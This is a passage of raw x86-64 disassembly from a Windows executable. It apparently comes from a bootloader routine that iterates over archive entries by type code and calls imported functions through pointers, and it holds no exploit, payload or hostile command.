   140002d38:	48 63 c8             	movslq %eax,%rcx
   140002d3b:	2b f8                	sub    %eax,%edi
   140002d3d:	41 0f 48 fd          	cmovs  %r13d,%edi
   140002d41:	48 8d 34 4e          	lea    (%rsi,%rcx,2),%rsi
   140002d45:	4c 89 6c 24 30       	mov    %r13,0x30(%rsp)
   140002d4a:	41 b9 00 04 00 00    	mov    $0x400,%r9d
   140002d50:	89 7c 24 28          	mov    %edi,0x28(%rsp)
   140002d54:	45 8b c4             	mov    %r12d,%r8d
   140002d57:	33 d2                	xor    %edx,%edx
   140002d59:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140002d5e:	b9 00 10 00 00       	mov    $0x1000,%ecx
   140002d63:	ff 15 5f 93 02 00    	call   *0x2935f(%rip)        # 0x14002c0c8
   140002d69:	85 c0                	test   %eax,%eax
   140002d6b:	75 12                	jne    0x140002d7f
   140002d6d:	48 63 d7             	movslq %edi,%rdx
   140002d70:	4c 8d 05 49 9f 02 00 	lea    0x29f49(%rip),%r8        # 0x14002ccc0
   140002d77:	48 8b ce             	mov    %rsi,%rcx
   140002d7a:	e8 31 f9 ff ff       	call   0x1400026b0
   140002d7f:	8b c5                	mov    %ebp,%eax
   140002d81:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   140002d86:	41 b9 10 00 00 00    	mov    $0x10,%r9d
   140002d8c:	4c 8d 05 b5 9f 02 00 	lea    0x29fb5(%rip),%r8        # 0x14002cd48
   140002d93:	33 c9                	xor    %ecx,%ecx
   140002d95:	48 8d 14 42          	lea    (%rdx,%rax,2),%rdx
   140002d99:	ff 15 89 96 02 00    	call   *0x29689(%rip)        # 0x14002c428
   140002d9f:	48 8b 8c 24 40 20 00 	mov    0x2040(%rsp),%rcx
   140002da6:	00 
   140002da7:	48 33 cc             	xor    %rsp,%rcx
   140002daa:	e8 21 98 00 00       	call   0x14000c5d0
   140002daf:	48 81 c4 58 20 00 00 	add    $0x2058,%rsp
   140002db6:	41 5f                	pop    %r15
   140002db8:	41 5e                	pop    %r14
   140002dba:	41 5d                	pop    %r13
   140002dbc:	41 5c                	pop    %r12
   140002dbe:	5f                   	pop    %rdi
   140002dbf:	5e                   	pop    %rsi
   140002dc0:	5d                   	pop    %rbp
   140002dc1:	5b                   	pop    %rbx
   140002dc2:	c3                   	ret
   140002dc3:	cc                   	int3
   140002dc4:	cc                   	int3
   140002dc5:	cc                   	int3
   140002dc6:	cc                   	int3
   140002dc7:	cc                   	int3
   140002dc8:	cc                   	int3
   140002dc9:	cc                   	int3
   140002dca:	cc                   	int3
   140002dcb:	cc                   	int3
   140002dcc:	cc                   	int3
   140002dcd:	cc                   	int3
   140002dce:	cc                   	int3
   140002dcf:	cc                   	int3
   140002dd0:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140002dd5:	56                   	push   %rsi
   140002dd6:	57                   	push   %rdi
   140002dd7:	41 55                	push   %r13
   140002dd9:	41 56                	push   %r14
   140002ddb:	41 57                	push   %r15
   140002ddd:	48 83 ec 30          	sub    $0x30,%rsp
   140002de1:	48 8b 05 58 00 04 00 	mov    0x40058(%rip),%rax        # 0x140042e40
   140002de8:	4c 8b f9             	mov    %rcx,%r15
   140002deb:	48 8d 0d 3e a0 02 00 	lea    0x2a03e(%rip),%rcx        # 0x14002ce30
   140002df2:	41 8b f9             	mov    %r9d,%edi
   140002df5:	49 8b d8             	mov    %r8,%rbx
   140002df8:	48 8b f2             	mov    %rdx,%rsi
   140002dfb:	45 33 f6             	xor    %r14d,%r14d
   140002dfe:	ff 15 bc 96 02 00    	call   *0x296bc(%rip)        # 0x14002c4c0
   140002e04:	4c 8b e8             	mov    %rax,%r13
   140002e07:	48 85 c0             	test   %rax,%rax
   140002e0a:	0f 84 9c 01 00 00    	je     0x140002fac
   140002e10:	48 8b c8             	mov    %rax,%rcx
   140002e13:	4c 89 64 24 68       	mov    %r12,0x68(%rsp)
   140002e18:	48 8b 05 51 00 04 00 	mov    0x40051(%rip),%rax        # 0x140042e70
   140002e1f:	48 8d 15 1a a0 02 00 	lea    0x2a01a(%rip),%rdx        # 0x14002ce40
   140002e26:	ff 15 94 96 02 00    	call   *0x29694(%rip)        # 0x14002c4c0
   140002e2c:	4c 8b e0             	mov    %rax,%r12
   140002e2f:	48 85 c0             	test   %rax,%rax
   140002e32:	0f 84 5f 01 00 00    	je     0x140002f97
   140002e38:	48 8b c8             	mov    %rax,%rcx
   140002e3b:	48 89 6c 24 60       	mov    %rbp,0x60(%rsp)
   140002e40:	48 8b 05 21 00 04 00 	mov    0x40021(%rip),%rax        # 0x140042e68
   140002e47:	4c 8b cb             	mov    %rbx,%r9
   140002e4a:	4c 8b c6             	mov    %rsi,%r8
   140002e4d:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   140002e52:	49 8b d7             	mov    %r15,%rdx
   140002e55:	41 8b ee             	mov    %r14d,%ebp
   140002e58:	ff 15 62 96 02 00    	call   *0x29662(%rip)        # 0x14002c4c0
   140002e5e:	4c 8b f8             	mov    %rax,%r15
   140002e61:	48 85 c0             	test   %rax,%rax
   140002e64:	0f 84 08 01 00 00    	je     0x140002f72
   140002e6a:	85 ff                	test   %edi,%edi
   140002e6c:	75 18                	jne    0x140002e86
   140002e6e:	48 8b c8             	mov    %rax,%rcx
   140002e71:	48 8b 05 08 00 04 00 	mov    0x40008(%rip),%rax        # 0x140042e80
   140002e78:	ff 15 42 96 02 00    	call   *0x29642(%rip)        # 0x14002c4c0
   140002e7e:	48 8b e8             	mov    %rax,%rbp
   140002e81:	e9 c7 00 00 00       	jmp    0x140002f4d
   140002e86:	48 8b 05 43 00 04 00 	mov    0x40043(%rip),%rax        # 0x140042ed0
   140002e8d:	48 8d 0d bd 9f 02 00 	lea    0x29fbd(%rip),%rcx        # 0x14002ce51
   140002e94:	ff 15 26 96 02 00    	call   *0x29626(%rip)        # 0x14002c4c0
   140002e9a:	48 8b d8             	mov    %rax,%rbx
   140002e9d:	48 8b c8             	mov    %rax,%rcx
   140002ea0:	48 8b 05 31 00 04 00 	mov    0x40031(%rip),%rax        # 0x140042ed8
   140002ea7:	49 8b d7             	mov    %r15,%rdx
   140002eaa:	ff 15 10 96 02 00    	call   *0x29610(%rip)        # 0x14002c4c0
   140002eb0:	48 8b e8             	mov    %rax,%rbp
   140002eb3:	48 8b cb             	mov    %rbx,%rcx
   140002eb6:	48 8b 05 d3 fe 03 00 	mov    0x3fed3(%rip),%rax        # 0x140042d90
   140002ebd:	ff 15 fd 95 02 00    	call   *0x295fd(%rip)        # 0x14002c4c0
   140002ec3:	83 ff 02             	cmp    $0x2,%edi
   140002ec6:	0f 85 81 00 00 00    	jne    0x140002f4d
   140002ecc:	48 8b 05 fd ff 03 00 	mov    0x3fffd(%rip),%rax        # 0x140042ed0
   140002ed3:	48 8d 0d 7a 9f 02 00 	lea    0x29f7a(%rip),%rcx        # 0x14002ce54
   140002eda:	ff 15 e0 95 02 00    	call   *0x295e0(%rip)        # 0x14002c4c0
   140002ee0:	48 8b f0             	mov    %rax,%rsi
   140002ee3:	48 8d 0d 6e 9f 02 00 	lea    0x29f6e(%rip),%rcx        # 0x14002ce58
   140002eea:	48 8b 05 df ff 03 00 	mov    0x3ffdf(%rip),%rax        # 0x140042ed0
   140002ef1:	ff 15 c9 95 02 00    	call   *0x295c9(%rip)        # 0x14002c4c0
   140002ef7:	49 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%r9
   140002efe:	48 8b d6             	mov    %rsi,%rdx
   140002f01:	48 8b f8             	mov    %rax,%rdi
   140002f04:	4c 8b c0             	mov    %rax,%r8
   140002f07:	48 8b 05 d2 ff 03 00 	mov    0x3ffd2(%rip),%rax        # 0x140042ee0
   140002f0e:	48 8b cd             	mov    %rbp,%rcx
   140002f11:	ff 15 a9 95 02 00    	call   *0x295a9(%rip)        # 0x14002c4c0
   140002f17:	48 8b d8             	mov    %rax,%rbx
   140002f1a:	48 8b ce             	mov    %rsi,%rcx
   140002f1d:	48 8b 05 6c fe 03 00 	mov    0x3fe6c(%rip),%rax        # 0x140042d90
   140002f24:	ff 15 96 95 02 00    	call   *0x29596(%rip)        # 0x14002c4c0
   140002f2a:	48 8b 05 5f fe 03 00 	mov    0x3fe5f(%rip),%rax        # 0x140042d90
   140002f31:	48 8b cf             	mov    %rdi,%rcx
   140002f34:	ff 15 86 95 02 00    	call   *0x29586(%rip)        # 0x14002c4c0
   140002f3a:	48 8b 05 4f fe 03 00 	mov    0x3fe4f(%rip),%rax        # 0x140042d90
   140002f41:	48 8b cd             	mov    %rbp,%rcx
   140002f44:	ff 15 76 95 02 00    	call   *0x29576(%rip)        # 0x14002c4c0
   140002f4a:	48 8b eb             	mov    %rbx,%rbp
   140002f4d:	48 85 ed             	test   %rbp,%rbp
   140002f50:	74 20                	je     0x140002f72
   140002f52:	48 8b 05 57 ff 03 00 	mov    0x3ff57(%rip),%rax        # 0x140042eb0
   140002f59:	48 8b cd             	mov    %rbp,%rcx
   140002f5c:	ff 15 5e 95 02 00    	call   *0x2955e(%rip)        # 0x14002c4c0
   140002f62:	48 85 c0             	test   %rax,%rax
   140002f65:	74 0b                	je     0x140002f72
   140002f67:	48 8b c8             	mov    %rax,%rcx
   140002f6a:	e8 59 74 01 00       	call   0x14001a3c8
   140002f6f:	4c 8b f0             	mov    %rax,%r14
   140002f72:	48 8b 05 17 fe 03 00 	mov    0x3fe17(%rip),%rax        # 0x140042d90
   140002f79:	49 8b cf             	mov    %r15,%rcx
   140002f7c:	ff 15 3e 95 02 00    	call   *0x2953e(%rip)        # 0x14002c4c0
   140002f82:	48 8b 05 07 fe 03 00 	mov    0x3fe07(%rip),%rax        # 0x140042d90
   140002f89:	48 8b cd             	mov    %rbp,%rcx
   140002f8c:	ff 15 2e 95 02 00    	call   *0x2952e(%rip)        # 0x14002c4c0
   140002f92:	48 8b 6c 24 60       	mov    0x60(%rsp),%rbp
   140002f97:	48 8b 05 f2 fd 03 00 	mov    0x3fdf2(%rip),%rax        # 0x140042d90
   140002f9e:	49 8b cc             	mov    %r12,%rcx
   140002fa1:	ff 15 19 95 02 00    	call   *0x29519(%rip)        # 0x14002c4c0
   140002fa7:	4c 8b 64 24 68       	mov    0x68(%rsp),%r12
   140002fac:	48 8b 05 dd fd 03 00 	mov    0x3fddd(%rip),%rax        # 0x140042d90
   140002fb3:	49 8b cd             	mov    %r13,%rcx
   140002fb6:	ff 15 04 95 02 00    	call   *0x29504(%rip)        # 0x14002c4c0
   140002fbc:	48 8b 5c 24 70       	mov    0x70(%rsp),%rbx
   140002fc1:	49 8b c6             	mov    %r14,%rax
   140002fc4:	48 83 c4 30          	add    $0x30,%rsp
   140002fc8:	41 5f                	pop    %r15
   140002fca:	41 5e                	pop    %r14
   140002fcc:	41 5d                	pop    %r13
   140002fce:	5f                   	pop    %rdi
   140002fcf:	5e                   	pop    %rsi
   140002fd0:	c3                   	ret
   140002fd1:	cc                   	int3
   140002fd2:	cc                   	int3
   140002fd3:	cc                   	int3
   140002fd4:	cc                   	int3
   140002fd5:	cc                   	int3
   140002fd6:	cc                   	int3
   140002fd7:	cc                   	int3
   140002fd8:	cc                   	int3
   140002fd9:	cc                   	int3
   140002fda:	cc                   	int3
   140002fdb:	cc                   	int3
   140002fdc:	cc                   	int3
   140002fdd:	cc                   	int3
   140002fde:	cc                   	int3
   140002fdf:	cc                   	int3
   140002fe0:	40 56                	rex push %rsi
   140002fe2:	41 55                	push   %r13
   140002fe4:	41 57                	push   %r15
   140002fe6:	b8 70 10 00 00       	mov    $0x1070,%eax
   140002feb:	e8 e0 98 00 00       	call   0x14000c8d0
   140002ff0:	48 2b e0             	sub    %rax,%rsp
   140002ff3:	48 8b 05 46 c0 03 00 	mov    0x3c046(%rip),%rax        # 0x14003f040
   140002ffa:	48 33 c4             	xor    %rsp,%rax
   140002ffd:	48 89 84 24 50 10 00 	mov    %rax,0x1050(%rsp)
   140003004:	00 
   140003005:	48 8b b1 10 20 00 00 	mov    0x2010(%rcx),%rsi
   14000300c:	4c 8b e9             	mov    %rcx,%r13
   14000300f:	48 8b 05 1a fe 03 00 	mov    0x3fe1a(%rip),%rax        # 0x140042e30
   140003016:	48 8d 0d 43 9e 02 00 	lea    0x29e43(%rip),%rcx        # 0x14002ce60
   14000301d:	ff 15 9d 94 02 00    	call   *0x2949d(%rip)        # 0x14002c4c0
   140003023:	4c 8b f8             	mov    %rax,%r15
   140003026:	48 85 c0             	test   %rax,%rax
   140003029:	75 16                	jne    0x140003041
   14000302b:	48 8d 0d 3e 9e 02 00 	lea    0x29e3e(%rip),%rcx        # 0x14002ce70
   140003032:	e8 d9 f6 ff ff       	call   0x140002710
   140003037:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   14000303c:	e9 a9 01 00 00       	jmp    0x1400031ea
   140003041:	48 8b 05 10 fe 03 00 	mov    0x3fe10(%rip),%rax        # 0x140042e58
   140003048:	49 8b cf             	mov    %r15,%rcx
   14000304b:	4c 89 a4 24 68 10 00 	mov    %r12,0x1068(%rsp)
   140003052:	00 
   140003053:	ff 15 67 94 02 00    	call   *0x29467(%rip)        # 0x14002c4c0
   140003059:	4c 8b e0             	mov    %rax,%r12
   14000305c:	48 85 c0             	test   %rax,%rax
   14000305f:	75 16                	jne    0x140003077
   140003061:	48 8d 0d 28 9e 02 00 	lea    0x29e28(%rip),%rcx        # 0x14002ce90
   140003068:	e8 a3 f6 ff ff       	call   0x140002710
   14000306d:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140003072:	e9 6b 01 00 00       	jmp    0x1400031e2
   140003077:	48 89 9c 24 98 10 00 	mov    %rbx,0x1098(%rsp)
   14000307e:	00 
   14000307f:	48 8b 9e 08 10 00 00 	mov    0x1008(%rsi),%rbx
   140003086:	48 89 ac 24 a0 10 00 	mov    %rbp,0x10a0(%rsp)
   14000308d:	00 
   14000308e:	48 89 bc 24 a8 10 00 	mov    %rdi,0x10a8(%rsp)
   140003095:	00 
   140003096:	4c 89 b4 24 60 10 00 	mov    %r14,0x1060(%rsp)
   14000309d:	00 
   14000309e:	48 3b 9e 10 10 00 00 	cmp    0x1010(%rsi),%rbx
   1400030a5:	0f 83 15 01 00 00    	jae    0x1400031c0
   1400030ab:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400030b0:	80 7b 11 73          	cmpb   $0x73,0x11(%rbx)
   1400030b4:	0f 85 eb 00 00 00    	jne    0x1400031a5
   1400030ba:	48 8b d3             	mov    %rbx,%rdx
   1400030bd:	48 8b ce             	mov    %rsi,%rcx
   1400030c0:	e8 ab e3 ff ff       	call   0x140001470
   1400030c5:	48 8b e8             	mov    %rax,%rbp
   1400030c8:	48 85 c0             	test   %rax,%rax
   1400030cb:	0f 84 78 02 00 00    	je     0x140003349
   1400030d1:	4c 8d 73 12          	lea    0x12(%rbx),%r14
   1400030d5:	ba 00 10 00 00       	mov    $0x1000,%edx
   1400030da:	4c 89 74 24 28       	mov    %r14,0x28(%rsp)
   1400030df:	4d 8d 8d 22 20 00 00 	lea    0x2022(%r13),%r9
   1400030e6:	4c 8d 05 f3 9d 02 00 	lea    0x29df3(%rip),%r8        # 0x14002cee0
   1400030ed:	c7 44 24 20 5c 00 00 	movl   $0x5c,0x20(%rsp)
   1400030f4:	00 
   1400030f5:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   1400030fa:	e8 81 eb ff ff       	call   0x140001c80
   1400030ff:	3d 00 10 00 00       	cmp    $0x1000,%eax
   140003104:	0f 8d 29 02 00 00    	jge    0x140003333
   14000310a:	48 8b 05 bf fd 03 00 	mov    0x3fdbf(%rip),%rax        # 0x140042ed0
   140003111:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140003116:	ff 15 a4 93 02 00    	call   *0x293a4(%rip)        # 0x14002c4c0
   14000311c:	48 8d 15 fd 9d 02 00 	lea    0x29dfd(%rip),%rdx        # 0x14002cf20
   140003123:	49 8b cf             	mov    %r15,%rcx
   140003126:	48 8b f8             	mov    %rax,%rdi
   140003129:	4c 8b c0             	mov    %rax,%r8
   14000312c:	48 8b 05 45 fd 03 00 	mov    0x3fd45(%rip),%rax        # 0x140042e78
   140003133:	ff 15 87 93 02 00    	call   *0x29387(%rip)        # 0x14002c4c0
   140003139:	48 8b 05 50 fc 03 00 	mov    0x3fc50(%rip),%rax        # 0x140042d90
   140003140:	48 8b cf             	mov    %rdi,%rcx
   140003143:	ff 15 77 93 02 00    	call   *0x29377(%rip)        # 0x14002c4c0
   140003149:	8b 53 0c             	mov    0xc(%rbx),%edx
   14000314c:	48 8b cd             	mov    %rbp,%rcx
   14000314f:	48 8b 05 f2 fc 03 00 	mov    0x3fcf2(%rip),%rax        # 0x140042e48
   140003156:	ff 15 64 93 02 00    	call   *0x29364(%rip)        # 0x14002c4c0
   14000315c:	48 8b cd             	mov    %rbp,%rcx
   14000315f:	48 8b f8             	mov    %rax,%rdi
   140003162:	e8 99 20 01 00       	call   0x140015200
   140003167:	48 85 ff             	test   %rdi,%rdi
   14000316a:	0f 84 9d 01 00 00    	je     0x14000330d
   140003170:	48 8b 05 01 fd 03 00 	mov    0x3fd01(%rip),%rax        # 0x140042e78
   140003177:	48 8d 15 da 9d 02 00 	lea    0x29dda(%rip),%rdx        # 0x14002cf58
   14000317e:	4c 8b c7             	mov    %rdi,%r8
   140003181:	49 8b cf             	mov    %r15,%rcx
   140003184:	ff 15 36 93 02 00    	call   *0x29336(%rip)        # 0x14002c4c0
   14000318a:	48 8b 05 97 fc 03 00 	mov    0x3fc97(%rip),%rax        # 0x140042e28
   140003191:	4d 8b c4             	mov    %r12,%r8
   140003194:	49 8b d4             	mov    %r12,%rdx
   140003197:	48 8b cf             	mov    %rdi,%rcx
   14000319a:	ff 15 20 93 02 00    	call   *0x29320(%rip)        # 0x14002c4c0
   1400031a0:	48 85 c0             	test   %rax,%rax
   1400031a3:	74 62                	je     0x140003207
   1400031a5:	48 8b d3             	mov    %rbx,%rdx
   1400031a8:	48 8b ce             	mov    %rsi,%rcx
   1400031ab:	e8 90 e7 ff ff       	call   0x140001940
   1400031b0:	48 8b d8             	mov    %rax,%rbx
   1400031b3:	48 3b 86 10 10 00 00 	cmp    0x1010(%rsi),%rax
   1400031ba:	0f 82 f0 fe ff ff    	jb     0x1400030b0
   1400031c0:	33 c0                	xor    %eax,%eax
   1400031c2:	48 8b 9c 24 98 10 00 	mov    0x1098(%rsp),%rbx
   1400031c9:	00 
   1400031ca:	48 8b bc 24 a8 10 00 	mov    0x10a8(%rsp),%rdi
   1400031d1:	00 
   1400031d2:	48 8b ac 24 a0 10 00 	mov    0x10a0(%rsp),%rbp
   1400031d9:	00 
   1400031da:	4c 8b b4 24 60 10 00 	mov    0x1060(%rsp),%r14
   1400031e1:	00 
   1400031e2:	4c 8b a4 24 68 10 00 	mov    0x1068(%rsp),%r12
   1400031e9:	00 
   1400031ea:	48 8b 8c 24 50 10 00 	mov    0x1050(%rsp),%rcx
   1400031f1:	00 
   1400031f2:	48 33 cc             	xor    %rsp,%rcx
   1400031f5:	e8 d6 93 00 00       	call   0x14000c5d0
   1400031fa:	48 81 c4 70 10 00 00 	add    $0x1070,%rsp
   140003201:	41 5f                	pop    %r15
   140003203:	41 5d                	pop    %r13
   140003205:	5e                   	pop    %rsi
   140003206:	c3                   	ret
   140003207:	48 8b 05 f2 fb 03 00 	mov    0x3fbf2(%rip),%rax        # 0x140042e00
   14000320e:	4c 8d 44 24 38       	lea    0x38(%rsp),%r8
   140003213:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140003218:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   14000321d:	ff 15 9d 92 02 00    	call   *0x2929d(%rip)        # 0x14002c4c0
   140003223:	48 8b 05 de fb 03 00 	mov    0x3fbde(%rip),%rax        # 0x140042e08
   14000322a:	4c 8d 44 24 38       	lea    0x38(%rsp),%r8
   14000322f:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140003234:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140003239:	ff 15 81 92 02 00    	call   *0x29281(%rip)        # 0x14002c4c0
   14000323f:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140003244:	33 f6                	xor    %esi,%esi
   140003246:	48 8b 05 33 fc 03 00 	mov    0x3fc33(%rip),%rax        # 0x140042e80
   14000324d:	ff 15 6d 92 02 00    	call   *0x2926d(%rip)        # 0x14002c4c0
   140003253:	48 8b f8             	mov    %rax,%rdi
   140003256:	48 8b c8             	mov    %rax,%rcx
   140003259:	48 8b 05 50 fc 03 00 	mov    0x3fc50(%rip),%rax        # 0x140042eb0
   140003260:	ff 15 5a 92 02 00    	call   *0x2925a(%rip)        # 0x14002c4c0
   140003266:	48 85 c0             	test   %rax,%rax
   140003269:	74 0b                	je     0x140003276
   14000326b:	48 8b c8             	mov    %rax,%rcx
   14000326e:	e8 55 71 01 00       	call   0x14001a3c8
   140003273:	48 8b f0             	mov    %rax,%rsi
   140003276:	48 8b 05 13 fb 03 00 	mov    0x3fb13(%rip),%rax        # 0x140042d90
   14000327d:	48 8b cf             	mov    %rdi,%rcx
   140003280:	ff 15 3a 92 02 00    	call   *0x2923a(%rip)        # 0x14002c4c0
   140003286:	41 80 bd 78 30 00 00 	cmpb   $0x0,0x3078(%r13)
   14000328d:	00 
   14000328e:	74 0e                	je     0x14000329e
   140003290:	48 8d 0d d1 9c 02 00 	lea    0x29cd1(%rip),%rcx        # 0x14002cf68
   140003297:	e8 2c 71 01 00       	call   0x14001a3c8
   14000329c:	eb 1a                	jmp    0x1400032b8
   14000329e:	4c 8b 44 24 38       	mov    0x38(%rsp),%r8
   1400032a3:	41 b9 02 00 00 00    	mov    $0x2,%r9d
   1400032a9:	48 8b 54 24 30       	mov    0x30(%rsp),%rdx
   1400032ae:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   1400032b3:	e8 18 fb ff ff       	call   0x140002dd0
   1400032b8:	4c 8b 44 24 38       	mov    0x38(%rsp),%r8
   1400032bd:	48 8b f8             	mov    %rax,%rdi
   1400032c0:	48 8b 05 59 fb 03 00 	mov    0x3fb59(%rip),%rax        # 0x140042e20
   1400032c7:	48 8b 54 24 30       	mov    0x30(%rsp),%rdx
   1400032cc:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   1400032d1:	ff 15 e9 91 02 00    	call   *0x291e9(%rip)        # 0x14002c4c0
   1400032d7:	48 8b 05 3a fb 03 00 	mov    0x3fb3a(%rip),%rax        # 0x140042e18
   1400032de:	ff 15 dc 91 02 00    	call   *0x291dc(%rip)        # 0x14002c4c0
   1400032e4:	48 8d 4b 12          	lea    0x12(%rbx),%rcx
   1400032e8:	4c 8b c7             	mov    %rdi,%r8
   1400032eb:	48 8b d6             	mov    %rsi,%rdx
   1400032ee:	e8 0d f2 ff ff       	call   0x140002500
   1400032f3:	48 8b ce             	mov    %rsi,%rcx
   1400032f6:	e8 05 1f 01 00       	call   0x140015200
   1400032fb:	48 8b cf             	mov    %rdi,%rcx
   1400032fe:	e8 fd 1e 01 00       	call   0x140015200
   140003303:	b8 01 00 00 00       	mov    $0x1,%eax
   140003308:	e9 b5 fe ff ff       	jmp    0x1400031c2
   14000330d:	49 8b d6             	mov    %r14,%rdx
   140003310:	48 8d 0d 19 9c 02 00 	lea    0x29c19(%rip),%rcx        # 0x14002cf30
   140003317:	e8 f4 f3 ff ff       	call   0x140002710
   14000331c:	48 8b 05 f5 fa 03 00 	mov    0x3faf5(%rip),%rax        # 0x140042e18
   140003323:	ff 15 97 91 02 00    	call   *0x29197(%rip)        # 0x14002c4c0
   140003329:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   14000332e:	e9 8f fe ff ff       	jmp    0x1400031c2
   140003333:	48 8d 0d b6 9b 02 00 	lea    0x29bb6(%rip),%rcx        # 0x14002cef0
   14000333a:	e8 d1 f3 ff ff       	call   0x140002710
   14000333f:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140003344:	e9 79 fe ff ff       	jmp    0x1400031c2
   140003349:	48 8d 0d 68 9b 02 00 	lea    0x29b68(%rip),%rcx        # 0x14002ceb8
   140003350:	e8 bb f3 ff ff       	call   0x140002710
   140003355:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   14000335a:	e9 63 fe ff ff       	jmp    0x1400031c2
   14000335f:	cc                   	int3
   140003360:	40 53                	rex push %rbx
   140003362:	48 83 ec 20          	sub    $0x20,%rsp
   140003366:	48 8b d9             	mov    %rcx,%rbx
   140003369:	e8 f2 2f 00 00       	call   0x140006360
   14000336e:	85 c0                	test   %eax,%eax
   140003370:	75 38                	jne    0x1400033aa
   140003372:	48 8b cb             	mov    %rbx,%rcx
   140003375:	c6 83 30 30 00 00 01 	movb   $0x1,0x3030(%rbx)
   14000337c:	e8 7f 31 00 00       	call   0x140006500
   140003381:	85 c0                	test   %eax,%eax
   140003383:	75 25                	jne    0x1400033aa
   140003385:	48 8b cb             	mov    %rbx,%rcx
   140003388:	e8 c3 2c 00 00       	call   0x140006050
   14000338d:	85 c0                	test   %eax,%eax
   14000338f:	75 19                	jne    0x1400033aa
   140003391:	48 8b cb             	mov    %rbx,%rcx
   140003394:	e8 47 2e 00 00       	call   0x1400061e0
   140003399:	85 c0                	test   %eax,%eax
   14000339b:	75 0d                	jne    0x1400033aa
   14000339d:	48 8b cb             	mov    %rbx,%rcx
   1400033a0:	48 83 c4 20          	add    $0x20,%rsp
   1400033a4:	5b                   	pop    %rbx
   1400033a5:	e9 36 fc ff ff       	jmp    0x140002fe0
   1400033aa:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   1400033af:	48 83 c4 20          	add    $0x20,%rsp
   1400033b3:	5b                   	pop    %rbx
   1400033b4:	c3                   	ret
   1400033b5:	cc                   	int3
   1400033b6:	cc                   	int3
   1400033b7:	cc                   	int3
   1400033b8:	cc                   	int3
   1400033b9:	cc                   	int3
   1400033ba:	cc                   	int3
   1400033bb:	cc                   	int3
   1400033bc:	cc                   	int3
   1400033bd:	cc                   	int3
   1400033be:	cc                   	int3
   1400033bf:	cc                   	int3
   1400033c0:	40 53                	rex push %rbx
   1400033c2:	41 56                	push   %r14
   1400033c4:	b8 f8 30 00 00       	mov    $0x30f8,%eax
   1400033c9:	e8 02 95 00 00       	call   0x14000c8d0
   1400033ce:	48 2b e0             	sub    %rax,%rsp
   1400033d1:	48 8b 05 68 bc 03 00 	mov    0x3bc68(%rip),%rax        # 0x14003f040
   1400033d8:	48 33 c4             	xor    %rsp,%rax
   1400033db:	48 89 84 24 d0 30 00 	mov    %rax,0x30d0(%rsp)
   1400033e2:	00 
   1400033e3:	48 89 ac 24 18 31 00 	mov    %rbp,0x3118(%rsp)
   1400033ea:	00 
   1400033eb:	45 33 f6             	xor    %r14d,%r14d
   1400033ee:	48 8b e9             	mov    %rcx,%rbp
   1400033f1:	48 89 bc 24 28 31 00 	mov    %rdi,0x3128(%rsp)
   1400033f8:	00 
   1400033f9:	4c 89 ac 24 e8 30 00 	mov    %r13,0x30e8(%rsp)
   140003400:	00 
   140003401:	33 d2                	xor    %edx,%edx
   140003403:	4c 8b a9 10 20 00 00 	mov    0x2010(%rcx),%r13
   14000340a:	41 b8 a0 00 00 00    	mov    $0xa0,%r8d
   140003410:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140003415:	41 8b de             	mov    %r14d,%ebx
   140003418:	e8 83 73 02 00       	call   0x14002a7a0
   14000341d:	49 8b bd 08 10 00 00 	mov    0x1008(%r13),%rdi
   140003424:	49 3b bd 10 10 00 00 	cmp    0x1010(%r13),%rdi
   14000342b:	0f 83 e1 01 00 00    	jae    0x140003612
   140003431:	4c 89 a4 24 f0 30 00 	mov    %r12,0x30f0(%rsp)
   140003438:	00 
   140003439:	41 bc ff ff ff ff    	mov    $0xffffffff,%r12d
   14000343f:	48 89 b4 24 20 31 00 	mov    %rsi,0x3120(%rsp)
   140003446:	00 
   140003447:	4c 89 bc 24 e0 30 00 	mov    %r15,0x30e0(%rsp)
   14000344e:	00 
   14000344f:	90                   	nop
   140003450:	0f b6 4f 11          	movzbl 0x11(%rdi),%ecx
   140003454:	8d 41 a6             	lea    -0x5a(%rcx),%eax
   140003457:	a8 f7                	test   $0xf7,%al
   140003459:	74 17                	je     0x140003472
   14000345b:	80 f9 64             	cmp    $0x64,%cl
   14000345e:	0f 84 02 01 00 00    	je     0x140003566
   140003464:	80 f9 6e             	cmp    $0x6e,%cl
   140003467:	74 09                	je     0x140003472
   140003469:	80 f9 78             	cmp    $0x78,%cl
   14000346c:	0f 85 3a 01 00 00    	jne    0x1400035ac
   140003472:	48 8d 77 12          	lea    0x12(%rdi),%rsi
   140003476:	85 db                	test   %ebx,%ebx
   140003478:	0f 85 7c 01 00 00    	jne    0x1400035fa
   14000347e:	48 8b 8d 18 20 00 00 	mov    0x2018(%rbp),%rcx
   140003485:	48 85 c9             	test   %rcx,%rcx
   140003488:	74 08                	je     0x140003492
   14000348a:	48 8b d6             	mov    %rsi,%rdx
   14000348d:	e8 5e 41 00 00       	call   0x1400075f0
   140003492:	48 89 74 24 28       	mov    %rsi,0x28(%rsp)
   140003497:	4c 8d 8d 22 20 00 00 	lea    0x2022(%rbp),%r9
   14000349e:	4c 8d 05 cf 98 02 00 	lea    0x298cf(%rip),%r8        # 0x14002cd74
   1400034a5:	c7 44 24 20 5c 00 00 	movl   $0x5c,0x20(%rsp)
   1400034ac:	00 
   1400034ad:	ba 00 10 00 00       	mov    $0x1000,%edx
   1400034b2:	48 8d 8c 24 d0 00 00 	lea    0xd0(%rsp),%rcx
   1400034b9:	00 
   1400034ba:	e8 c1 e7 ff ff       	call   0x140001c80
